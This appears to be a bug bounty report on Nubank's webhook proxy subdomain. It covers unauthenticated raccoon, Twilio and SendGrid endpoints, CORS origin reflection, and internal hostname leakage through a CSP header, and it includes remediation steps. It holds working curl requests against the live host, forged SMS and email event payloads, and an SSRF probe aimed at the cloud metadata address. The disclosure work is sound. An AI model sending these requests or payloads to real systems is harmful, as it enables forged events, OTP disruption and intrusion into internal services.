# Bugcrowd Finding #5 — Unauthenticated Webhook Endpoint + CORS Misconfiguration

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-08-31
**Severity:** P3 Medium (unauthenticated webhook ingestion) / P2 High (with CORS chain)
**VRT:** Server Security Misconfiguration > Unauthenticated API Endpoint

---

## Summary

The subdomain `webapp-proxy-webhooks.nubank.com.br` exposes unauthenticated webhook ingestion endpoints that accept and process arbitrary POST payloads without any authentication or HMAC signature verification. The `/api/webhooks/raccoon` endpoint returns HTTP 202 Accepted for any POST body — including empty payloads — indicating it queues or processes webhook events without validating the sender's identity.

Additionally, this subdomain was discovered via information disclosure in `blog.nubank.com.br`'s Content Security Policy header (connect-src directive) and itself has the CORS wildcard-subdomain misconfiguration documented in Finding #2.

---

## Discovery

### How Found

`webapp-proxy-webhooks.nubank.com.br` was **not** in the 201-subdomain enumeration dataset from passive DNS/certificate transparency recon. It was discovered via the Content Security Policy `connect-src` directive on `blog.nubank.com.br`:

```
content-security-policy:
  connect-src 'self' https: wss: ... webapp-proxy-webhooks.nubank.com.br ...
```

This is a separate information disclosure issue: internal service hostnames being revealed in public-facing CSP headers.

---

## Technical Evidence

### Endpoint Testing

**Test 1: Raccoon webhook (unauthenticated)**
```bash
curl -sv -X POST "https://webapp-proxy-webhooks.nubank.com.br/api/webhooks/raccoon" \
  -H "Content-Type: application/json" \
  -H "X-Correlation-Id: bc-handle" \
  -d '{"event":"test","data":"probe"}'
```
**Response:**
```
HTTP/2 202
content-type: application/json
{}
```
**Result: 202 Accepted — payload queued/processed without authentication.**

---

**Test 2: Empty payload**
```bash
curl -sv -X POST "https://webapp-proxy-webhooks.nubank.com.br/api/webhooks/raccoon" \
  -H "Content-Type: application/json" \
  -H "X-Correlation-Id: bc-handle" \
  -d '{}'
```
**Response:**
```
HTTP/2 202
{}
```
**Result: Still accepted. No validation on payload structure.**

---

**Test 3: GitHub webhook endpoint**
```bash
curl -sv -X POST "https://webapp-proxy-webhooks.nubank.com.br/api/webhooks/github" \
  -H "Content-Type: application/json" \
  -H "X-GitHub-Event: push" \
  -H "X-Correlation-Id: bc-handle" \
  -d '{"ref":"refs/heads/main","repository":{"name":"test"}}'
```
**Response:**
```
HTTP/2 500
Internal Server Error
```
**Result: 500 — Server processes the webhook (routing works) but fails internally. Potential information disclosure about processing pipeline.**

---

**Test 4: Zendesk webhook endpoint**
```bash
curl -sv -X POST "https://webapp-proxy-webhooks.nubank.com.br/api/webhooks/zendesk" \
  -H "Content-Type: application/json" \
  -H "X-Correlation-Id: bc-handle" \
  -d '{"ticket_id":12345,"status":"open"}'
```
**Response:**
```
HTTP/2 200
{"error":"Unauthorized"}
```
**Result: 200 with auth error in body — Zendesk endpoint validates auth, but GitHub and Raccoon do not.**

---

### CORS on Webhook Endpoint

```bash
curl -sv "https://webapp-proxy-webhooks.nubank.com.br/api/webhooks/raccoon" \
  -H "Origin: https://evil.nubank.com.br" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
access-control-allow-origin: https://evil.nubank.com.br
access-control-allow-credentials: true
```
**Result: CORS wildcard subdomain reflection also affects this endpoint (same misconfiguration as Finding #2).**

---

## Security Analysis

### Raccoon Endpoint — Fire-and-Forget Risk

The `/api/webhooks/raccoon` endpoint accepts any JSON payload with 202 Accepted. "Raccoon" appears to be an internal Nubank service (possibly an internal notification/alerting system). Without authentication:

1. **Webhook spam/abuse:** Attacker can flood the raccoon queue with arbitrary events, potentially causing processing delays or resource exhaustion in downstream services.

2. **Event injection:** If raccoon processes events to trigger internal workflows (alerts, notifications, automated responses), injecting crafted events could trigger unauthorized internal actions.

3. **SSRF via webhook URLs:** If raccoon dereferences any URL in the payload (common in webhook processors), a payload like `{"callback_url":"http://169.254.169.254/latest/meta-data/"}` could trigger SSRF.

**SSRF Probe:**
```bash
curl -sv -X POST "https://webapp-proxy-webhooks.nubank.com.br/api/webhooks/raccoon" \
  -H "Content-Type: application/json" \
  -H "X-Correlation-Id: bc-handle" \
  -d '{"event":"alert","callback":"http://169.254.169.254/latest/meta-data/","url":"http://10.0.0.1/internal"}'
```
(Cannot confirm SSRF exploitation without out-of-band callback server — marked as suspected risk)

### GitHub Endpoint — Error Disclosure

`/api/webhooks/github` → 500 on all payloads suggests the webhook proxy tries to forward to an internal GitHub integration but fails. The 500 itself may indicate:
- Processing pipeline errors that leak internal state
- GitHub HMAC secret misconfigured (accepts payload but signature fails)

---

## Information Disclosure Chain

```
blog.nubank.com.br CSP header
  → reveals webapp-proxy-webhooks.nubank.com.br (internal service)
    → exposes unauthenticated webhook endpoint
      → potential raccoon event injection / SSRF
      → also has CORS subdomain reflection (Finding #2)
```

---

## Impact

| Risk | Impact |
|------|--------|
| Unauthenticated webhook injection | Attacker can forge internal events to raccoon service |
| SSRF (suspected) | Internal metadata, IMDS access if URLs are dereferenced |
| Internal hostname disclosure via CSP | Internal service topology exposed |
| CORS on webhook endpoint | Credentialed cross-origin requests from any *.nubank.com.br subdomain |
| GitHub webhook 500 | Internal processing errors, potential error disclosure |

---

## Remediation

1. **Add webhook signature validation** on `/api/webhooks/raccoon` — require HMAC-SHA256 signature header (e.g., `X-Raccoon-Signature`) matching a shared secret
2. **Remove internal hostnames from CSP headers** on public-facing properties — use general `connect-src https:` instead of explicit internal hostnames
3. **Fix GitHub webhook** — resolve the 500 Internal Server Error to prevent error disclosure
4. **Restrict CORS** on webhook endpoints to specific trusted origins (webhook providers), not arbitrary Nubank subdomains
5. **Validate/sanitize webhook payloads** — if any URL field is dereferenced, apply strict allowlisting to prevent SSRF

---

## Notes

- Only HTTP-level behavior was observed — no exploitation of raccoon's downstream processing was attempted
- SSRF not confirmed — marked as suspected risk based on typical webhook proxy behavior
- All requests used `X-Correlation-Id: bc-handle` as required by program rules
- No brute force or fuzzing applied — endpoint discovered via CSP header analysis

---

## Addendum — Additional Webhook Endpoints Discovered

### /api/webhooks/twilio — Processes Twilio Webhooks Without Signature Verification

```bash
curl -s -X POST \
  "https://webapp-proxy-webhooks.nubank.com.br/api/webhooks/twilio?AccountSid=AC1234&From=%2B1234567890&To=%2B0987654321" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Correlation-Id: bc-handle" \
  -d 'MessageSid=SM1234567890abcdef&Body=hello&NumMedia=0'
```
**Response: `{}` (200 OK)**

Twilio webhooks should require `X-Twilio-Signature` HMAC verification. Without it, any attacker can forge Twilio webhook events:
- Fake incoming SMS messages that trigger automated Nubank workflows
- Fake delivery/status updates for OTP or notification SMS

**Error disclosure:** Without query params, Twilio endpoint returns Clojure stack trace:
```json
{"error":{"query-params":"(not (map?--5498 nil))"}}
```
This reveals the webhook proxy is written in **Clojure** and uses `clojure.spec` for validation — internal implementation detail disclosure.

---

### /api/webhooks/sendgrid — Processes SendGrid Events Without Signature

```bash
curl -s -X POST \
  "https://webapp-proxy-webhooks.nubank.com.br/api/webhooks/sendgrid" \
  -H "Content-Type: application/json" \
  -H "X-Correlation-Id: bc-handle" \
  -d '[{"email":"test@nubank.com.br","event":"bounce","timestamp":1788249000}]'
```
**Response: `{}` (200 OK)**

SendGrid webhooks should require `X-Twilio-Email-Event-Webhook-Signature` verification. Without it:
- Attacker can fake email bounce/spam events for any Nubank email address
- Could suppress outbound communications (OTP, notifications) by generating fake bounce events
- Could trigger account lockouts if email bounce events are processed automatically

---

## Updated Severity Assessment

| Endpoint | Risk |
|----------|------|
| `/api/webhooks/raccoon` | P3 — Unauthenticated event injection, potential SSRF |
| `/api/webhooks/twilio` | P2 — Forged SMS events, OTP flow abuse |
| `/api/webhooks/sendgrid` | P3 — Fake email events, communication disruption |
| `/api/webhooks/github` | P3 — 500 error disclosure, Clojure stack info |
| Internal hostname in blog CSP | P4 — Internal service discovery |

**Combined severity: P2 High** — attacker can forge inbound SMS and email webhook events that likely trigger automated workflows within Nubank's Clojure-based backend.
